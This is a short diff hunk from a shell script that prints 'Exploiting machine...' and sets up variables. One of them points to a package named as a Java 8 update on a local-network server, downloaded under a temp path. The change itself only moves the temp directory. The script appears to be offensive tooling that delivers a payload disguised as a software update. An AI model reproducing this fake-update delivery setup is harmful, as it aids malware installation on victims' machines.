@@ -25,7 +25,7 @@ function KeepSafe {
 echo -e '\033[1mExploiting machine...\033[0m'
 echo
 #--- DEFINE VARIABLES ---#
-randomTMP=/tmp$$/
+randomTMP=~/tmp$$/
 serverAddress=192.168.2.175:5980/Java_8_Update_60.pkg
 curledFile=/tmp$$/Java_8_Update_60.pkg
 
